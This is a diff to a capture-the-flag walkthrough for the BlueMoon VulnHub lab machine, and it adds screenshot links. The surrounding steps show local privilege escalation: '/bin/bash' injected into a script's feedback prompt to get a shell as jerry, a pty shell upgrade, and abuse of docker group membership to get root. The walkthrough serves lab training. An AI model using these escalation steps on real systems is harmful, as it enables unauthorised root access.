@@ -171,6 +171,8 @@ Run the script as jerry:
 sudo -u jerry /home/robin/project/feedback.sh
 ```
 
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/runasjerry.png)
+
 - When prompted for **name**, type: `jerry`
 - When prompted for **feedback**, type: `/bin/bash`
 
@@ -196,11 +198,15 @@ Upgrade to interactive shell:
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/python.png)
+
 Check group membership:
 
 ```bash
 id
 ```
+
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/iddocker.png)
 
 > User **jerry** is in the **docker** group
 
@@ -209,6 +215,8 @@ List available Docker images:
 ```bash
 docker image ls
 ```
+
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/dockerimagels.png)
 
 Exploit the Alpine image to get root:
 
@@ -222,6 +230,8 @@ cd /root
 ls -al
 cat root.txt
 ```
+
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/db9c66e1c7d73ce3ac13129497e077a77d5e9459/images/dockeralpine.png)
 
 > 🚩 **Root flag obtained! Machine pwned!**
 
